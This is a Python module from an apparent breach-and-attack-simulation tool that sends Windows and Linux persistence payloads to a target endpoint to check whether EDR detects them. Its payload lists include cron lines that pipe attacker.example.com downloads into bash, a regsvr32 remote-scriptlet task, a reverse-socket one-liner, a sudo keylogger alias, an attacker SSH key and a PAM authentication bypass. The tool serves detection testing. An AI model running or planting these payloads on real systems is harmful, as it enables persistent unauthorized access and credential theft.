"""
Backdoor Persistence Simulation module.

Tests detection of backdoor persistence mechanisms including scheduled tasks,
cron jobs, startup persistence, DLL hijacking paths, registry autorun keys,
WMI event subscriptions, service installations, and browser extension paths.

MITRE ATT&CK: T1547 - Boot or Logon Autostart Execution
MITRE ATT&CK: T1053 - Scheduled Task/Job

For authorized breach and attack simulation only. Validates that EDR,
host IDS, and security monitoring detect persistence establishment.
"""

from __future__ import annotations

import uuid
from typing import Any

from bas.core.executor import AttackRequest, AttackResponse
from bas.core.scope import AuthorizationLevel
from bas.modules.base_module import BaseAttackModule, ModuleMetadata, ModuleResult, VulnStatus


# Windows scheduled task persistence indicators
SCHEDULED_TASK_PAYLOADS = [
    "SCHTASK:schtasks /create /tn \"BAS_Updater\" /tr \"powershell.exe -ep bypass -f C:\\temp\\update.ps1\" /sc onlogon",
    "SCHTASK:schtasks /create /tn \"SystemHealthCheck\" /tr \"cmd /c whoami > C:\\temp\\out.txt\" /sc minute /mo 5",
    "SCHTASK:schtasks /create /tn \"\\Microsoft\\Windows\\Maintenance\\BAS\" /tr \"rundll32.exe shell32.dll,ShellExec_RunDLL\" /sc onstart",
    "SCHTASK:schtasks /query /tn \"BAS_Updater\" /fo LIST /v",
    "SCHTASK:schtasks /create /tn \"ChromeUpdate\" /tr \"mshta vbscript:Execute(CreateObject(\\\"Wscript.Shell\\\").Run \\\"powershell\\\")\" /sc daily",
    "SCHTASK:schtasks /create /tn \"AdobeFlashUpdate\" /tr \"regsvr32 /s /n /u /i:http://attacker.example.com/file.sct scrobj.dll\" /sc onlogon",
]

# Linux cron persistence indicators
CRON_PAYLOADS = [
    "CRON:* * * * * /tmp/.bas_beacon.sh",
    "CRON:*/5 * * * * curl http://attacker.example.com/beacon | bash",
    "CRON:@reboot /usr/local/bin/.hidden_service",
    "CRON:0 */4 * * * python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"10.0.0.1\",4444))'",
    "CRON:*/10 * * * * wget -q http://attacker.example.com/update -O /tmp/.update && chmod +x /tmp/.update && /tmp/.update",
    "CRON:0 0 * * * /dev/shm/.cron_persistence 2>/dev/null",
    "CRON_PATH:/etc/cron.d/bas_persistence",
    "CRON_PATH:/var/spool/cron/crontabs/root",
    "CRON_PATH:/etc/cron.hourly/.hidden_task",
    "CRON_PATH:/etc/cron.daily/.system_check",
]

# Windows startup persistence paths
STARTUP_PAYLOADS = [
    "STARTUP_PATH:C:\\Users\\Public\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.bat",
    "STARTUP_PATH:C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\service.exe",
    "STARTUP_PATH:C:\\Windows\\System32\\Tasks\\MicrosoftEdgeUpdateTaskMachine",
    "STARTUP_PATH:%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\helper.vbs",
    "STARTUP_REG:HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\BASUpdate",
    "STARTUP_REG:HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityService",
    "STARTUP_REG:HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\Installer",
    "STARTUP_REG:HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001",
]

# DLL hijacking paths
DLL_HIJACK_PAYLOADS = [
    "DLL_HIJACK:C:\\Windows\\System32\\version.dll",
    "DLL_HIJACK:C:\\Windows\\System32\\cryptsp.dll",
    "DLL_HIJACK:C:\\Program Files\\Common Files\\System\\wab32.dll",
    "DLL_HIJACK:C:\\Windows\\System32\\wow64log.dll",
    "DLL_HIJACK:C:\\Windows\\System32\\TextShaping.dll",
    "DLL_HIJACK:C:\\Windows\\System32\\windowscoredeviceinfo.dll",
    "DLL_SIDELOAD:C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE:wwlib.dll",
    "DLL_SIDELOAD:C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe:chrome_elf.dll",
]

# WMI event subscription persistence
WMI_PAYLOADS = [
    "WMI_SUB:__EventFilter:BAS_ProcessFilter:SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process'",
    "WMI_SUB:__EventConsumer:BAS_Consumer:CommandLineEventConsumer:cmd /c powershell -ep bypass -f C:\\temp\\payload.ps1",
    "WMI_SUB:__FilterToConsumerBinding:BAS_Binding:BAS_ProcessFilter:BAS_Consumer",
    "WMI_SUB:ActiveScriptEventConsumer:BAS_Script:VBScript:CreateObject(\"Wscript.Shell\").Run \"calc.exe\"",
    "WMI_QUERY:SELECT * FROM __EventFilter",
    "WMI_QUERY:SELECT * FROM __EventConsumer",
    "WMI_QUERY:SELECT * FROM __FilterToConsumerBinding",
]

# Service persistence
SERVICE_PAYLOADS = [
    "SERVICE:sc create BASService binPath= \"C:\\temp\\service.exe\" start= auto",
    "SERVICE:sc create UpdateSvc binPath= \"cmd /c powershell -ep bypass -f C:\\temp\\svc.ps1\" start= auto",
    "SERVICE:New-Service -Name 'BASAgent' -BinaryPathName 'C:\\Windows\\Temp\\agent.exe' -StartupType Automatic",
    "SERVICE:systemctl enable bas-persistence.service",
    "SERVICE:update-rc.d bas-persistence defaults",
    "SERVICE_PATH:/etc/systemd/system/bas-persistence.service",
    "SERVICE_PATH:/etc/init.d/bas-persistence",
    "SERVICE_PATH:C:\\Windows\\System32\\drivers\\bas_driver.sys",
]

# Browser extension persistence
BROWSER_EXT_PAYLOADS = [
    "BROWSER_EXT:chrome-extension://abcdefghijklmnop/manifest.json",
    "BROWSER_EXT:~/.config/google-chrome/Default/Extensions/malicious_ext/",
    "BROWSER_EXT:~/.mozilla/firefox/profile/extensions/malicious@addon.xpi",
    "BROWSER_EXT:C:\\Users\\*\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions\\suspicious\\",
    "BROWSER_EXT:HKCU\\Software\\Google\\Chrome\\Extensions\\abcdefghijklmnop",
    "BROWSER_EXT:C:\\Users\\*\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*\\extensions.json",
]

# Linux persistence mechanisms
LINUX_PERSIST_PAYLOADS = [
    "LINUX_PERSIST:/etc/ld.so.preload:malicious.so",
    "LINUX_PERSIST:/etc/rc.local:nohup /tmp/.backdoor &",
    "LINUX_PERSIST:~/.bashrc:alias sudo='sudo /tmp/.keylog $@ && sudo'",
    "LINUX_PERSIST:~/.ssh/authorized_keys:ssh-rsa AAAA... attacker@c2",
    "LINUX_PERSIST:/etc/profile.d/bas.sh:export PATH=/tmp/.hidden:$PATH",
    "LINUX_PERSIST:/lib/systemd/system/bas.service:[Service]\\nExecStart=/tmp/.backdoor",
    "LINUX_PERSIST:/etc/pam.d/common-auth:auth sufficient pam_permit.so",
]

# Persistence detection indicators in responses
PERSISTENCE_INDICATORS = [
    "task created successfully", "task registered", "service created",
    "crontab installed", "autostart added", "registry key set",
    "wmi subscription created", "dll loaded", "extension installed",
    "service started", "daemon registered", "rc.local updated",
    "authorized_keys", "systemd unit", "init script",
]


class BackdoorSimModule(BaseAttackModule):
    """
    Backdoor persistence simulation module.

    Tests detection of various persistence mechanisms across Windows and Linux
    platforms. Simulates scheduled tasks, cron jobs, startup items, DLL hijacking,
    registry autorun, WMI subscriptions, services, and browser extensions.
    """

    @property
    def metadata(self) -> ModuleMetadata:
        return ModuleMetadata(
            name="backdoor_sim",
            description="Backdoor persistence simulation - tests detection of persistence mechanisms",
            category="persistence",
            mitre_technique_ids=["T1547", "T1053", "T1574", "T1543", "T1546"],
            mitre_technique_names=[
                "Boot or Logon Autostart Execution",
                "Scheduled Task/Job",
                "Hijack Execution Flow",
                "Create or Modify System Process",
                "Event Triggered Execution",
            ],
            auth_level_required=AuthorizationLevel.AGGRESSIVE,
            owasp_category="",
            cwe_ids=["CWE-284", "CWE-269"],
            tags=["persistence", "backdoor", "scheduled_task", "cron", "dll_hijack",
                  "wmi", "service", "autorun", "startup"],
        )

    async def _get_payloads(self, target: str, options: dict[str, Any]) -> list[str]:
        """Assemble backdoor persistence simulation payloads."""
        if self._payload_db:
            db_payloads = await self._payload_db.get_payloads("backdoor_sim", limit=200)
            if db_payloads:
                return db_payloads

        payloads: list[str] = []
        payloads.extend(SCHEDULED_TASK_PAYLOADS)
        payloads.extend(CRON_PAYLOADS)
        payloads.extend(STARTUP_PAYLOADS)
        payloads.extend(DLL_HIJACK_PAYLOADS)
        payloads.extend(WMI_PAYLOADS)
        payloads.extend(SERVICE_PAYLOADS)
        payloads.extend(BROWSER_EXT_PAYLOADS)
        payloads.extend(LINUX_PERSIST_PAYLOADS)
        return payloads

    def _build_requests(
        self, target: str, payloads: list[str], options: dict[str, Any]
    ) -> list[AttackRequest]:
        """Build backdoor persistence test requests from payloads."""
        requests: list[AttackRequest] = []
        test_endpoint = options.get("endpoint", "/api/execute")

        for payload in payloads:
            req_id = f"backdoor-{uuid.uuid4().hex[:8]}"

            if payload.startswith("SCHTASK:"):
                command = payload.split(":", 1)[1]
                requests.append(AttackRequest(
                    request_id=req_id,
                    target=target,
                    method="POST",
                    path=test_endpoint,
                    body=f"cmd={command}",
                    content_type="application/x-www-form-urlencoded",
                    headers={"X-BAS-Attack-Type": "scheduled_task"},
                    timeout=options.get("timeout", 15.0),
                ))

            elif payload.startswith("CRON:"):
                cron_entry = payload.split(":", 1)[1]
                requests.append(AttackRequest(
                    request_id=req_id,
                    target=target,
                    method="POST",
                    path=test_endpoint,
                    body=f"cron={cron_entry}",
                    content_type="application/x-www-form-urlencoded",
                    headers={"X-BAS-Attack-Type": "cron_persistence"},
                    timeout=options.get("timeout", 15.0),
                ))

            elif payload.startswith("CRON_PATH:"):
                path = payload.split(":", 1)[1]
                requests.append(AttackRequest(
                    request_id=req_id,
                    target=target,
                    method="GET",
                    path=test_endpoint,
                    params={"check_path": path, "type": "cron"},
                    headers={"X-BAS-Attack-Type": "cron_path_probe"},
                    timeout=options.get("timeout", 10.0),
                ))

            elif payload.startswith("STARTUP_PATH:"):
                path = payload.split(":", 1)[1]
                requests.append(AttackRequest(
                    request_id=req_id,
                    target=target,
                    method="GET",
                    path=test_endpoint,
                    params={"check_path": path, "type": "startup"},
                    headers={"X-BAS-Attack-Type": "startup_persistence"},
                    timeout=options.get("timeout", 10.0),
                ))

            elif payload.startswith("STARTUP_REG:"):
                reg_key = payload.split(":", 1)[1]
                requests.append(AttackRequest(
                    request_id=req_id,
                    target=target,
                    method="POST",
                    path=test_endpoint,
                    body=f"reg_key={reg_key}&action=check",
                    content_type="application/x-www-form-urlencoded",
                    headers={"X-BAS-Attack-Type": "registry_autorun"},
                    timeout=options.get("timeout", 10.0),
                ))

            elif payload.startswith("DLL_HIJACK:") or payload.startswith("DLL_SIDELOAD:"):
                dll_path = payload.split(":", 1)[1]
                attack_sub = "dll_hijack" if payload.startswith("DLL_HIJACK") else "dll_sideload"
                requests.append(AttackRequest(
                    request_id=req_id,
                    target=target,
                    method="GET",
                    path=test_endpoint,
                    params={"dll_path": dll_path, "type": attack_sub},
                    headers={"X-BAS-Attack-Type": attack_sub},
                    timeout=options.get("timeout", 10.0),
                ))

            elif payload.startswith("WMI_SUB:") or payload.startswith("WMI_QUERY:"):
                wmi_data = payload.split(":", 1)[1]
                requests.append(AttackRequest(
                    request_id=req_id,
                    target=target,
                    method="POST",
                    path=test_endpoint,
                    body=f"wmi={wmi_data}",
                    content_type="application/x-www-form-urlencoded",
                    headers={"X-BAS-Attack-Type": "wmi_persistence"},
                    timeout=options.get("timeout", 15.0),
                ))

            elif payload.startswith("SERVICE:"):
                svc_cmd = payload.split(":", 1)[1]
                requests.append(AttackRequest(
                    request_id=req_id,
                    target=target,
                    method="POST",
                    path=test_endpoint,
                    body=f"cmd={svc_cmd}",
                    content_type="application/x-www-form-urlencoded",
                    headers={"X-BAS-Attack-Type": "service_persistence"},
                    timeout=options.get("timeout", 15.0),
                ))

            elif payload.startswith("SERVICE_PATH:"):
                svc_path = payload.split(":", 1)[1]
                requests.append(AttackRequest(
                    request_id=req_id,
                    target=target,
                    method="GET",
                    path=test_endpoint,
                    params={"check_path": svc_path, "type": "service"},
                    headers={"X-BAS-Attack-Type": "service_path_probe"},
                    timeout=options.get("timeout", 10.0),
                ))

            elif payload.startswith("BROWSER_EXT:"):
                ext_path = payload.split(":", 1)[1]
                requests.append(AttackRequest(
                    request_id=req_id,
                    target=target,
                    method="GET",
                    path=test_endpoint,
                    params={"ext_path": ext_path, "type": "browser_extension"},
                    headers={"X-BAS-Attack-Type": "browser_extension"},
                    timeout=options.get("timeout", 10.0),
                ))

            elif payload.startswith("LINUX_PERSIST:"):
                persist_data = payload.split(":", 1)[1]
                requests.append(AttackRequest(
                    request_id=req_id,
                    target=target,
                    method="POST",
                    path=test_endpoint,
                    body=f"persist={persist_data}",
                    content_type="application/x-www-form-urlencoded",
                    headers={"X-BAS-Attack-Type": "linux_persistence"},
                    timeout=options.get("timeout", 15.0),
                ))

            else:
                requests.append(AttackRequest(
                    request_id=req_id,
                    target=target,
                    method="POST",
                    path=test_endpoint,
                    body=payload,
                    content_type="text/plain",
                    headers={"X-BAS-Attack-Type": "persistence_generic"},
                    timeout=options.get("timeout", 15.0),
                ))

        return requests

    def _analyze_response(
        self, request: AttackRequest, response: AttackResponse, payload: str
    ) -> ModuleResult:
        """Analyze response for persistence establishment indicators."""
        attack_type = request.headers.get("X-BAS-Attack-Type", "unknown")
        body_lower = response.body_text.lower()

        # Persistence success indicators
        success_indicators: list[str] = []
        for indicator in PERSISTENCE_INDICATORS:
            if indicator.lower() in body_lower:
                success_indicators.append(indicator)

        # Security control blocked indicators
        blocked_indicators = [
            "blocked", "denied", "forbidden", "policy violation",
            "access denied", "not permitted", "security alert",
            "edr", "threat detected", "quarantined", "prevented",
        ]
        was_blocked = (
            response.status_code in (403, 406, 423, 451)
            or any(ind in body_lower for ind in blocked_indicators)
        )

        # Map attack types to MITRE technique IDs
        technique_map = {
            "scheduled_task": "T1053",
            "cron_persistence": "T1053",
            "cron_path_probe": "T1053",
            "startup_persistence": "T1547",
            "registry_autorun": "T1547",
            "dll_hijack": "T1574",
            "dll_sideload": "T1574",
            "wmi_persistence": "T1546",
            "service_persistence": "T1543",
            "service_path_probe": "T1543",
            "browser_extension": "T1176",
            "linux_persistence": "T1547",
        }
        technique_id = technique_map.get(attack_type, "T1547")

        if was_blocked:
            return ModuleResult(
                module_name="backdoor_sim",
                target=request.target,
                status=VulnStatus.NOT_VULNERABLE,
                payload_used=payload,
                response_code=response.status_code,
                elapsed_ms=response.elapsed_ms,
                evidence=f"Persistence attempt ({attack_type}) blocked by security controls",
                severity="info",
                mitre_technique_id=technique_id,
                detail={"attack_type": attack_type, "blocked": True},
            )

        if response.status_code in (200, 201) and success_indicators:
            return ModuleResult(
                module_name="backdoor_sim",
                target=request.target,
                status=VulnStatus.VULNERABLE,
                payload_used=payload,
                response_code=response.status_code,
                response_body_preview=response.body_text[:500],
                elapsed_ms=response.elapsed_ms,
                evidence=f"Persistence mechanism accepted ({attack_type}): {', '.join(success_indicators[:3])}",
                severity="critical",
                mitre_technique_id=technique_id,
                detail={
                    "attack_type": attack_type,
                    "blocked": False,
                    "indicators": success_indicators,
                },
            )

        if response.status_code in (200, 201):
            return ModuleResult(
                module_name="backdoor_sim",
                target=request.target,
                status=VulnStatus.POTENTIALLY_VULNERABLE,
                payload_used=payload,
                response_code=response.status_code,
                response_body_preview=response.body_text[:300],
                elapsed_ms=response.elapsed_ms,
                evidence=f"Persistence payload ({attack_type}) accepted without detection (HTTP {response.status_code})",
                severity="high",
                mitre_technique_id=technique_id,
                detail={"attack_type": attack_type, "blocked": False},
            )

        return ModuleResult(
            module_name="backdoor_sim",
            target=request.target,
            status=VulnStatus.NOT_VULNERABLE,
            payload_used=payload,
            response_code=response.status_code,
            elapsed_ms=response.elapsed_ms,
            detail={"attack_type": attack_type},
        )
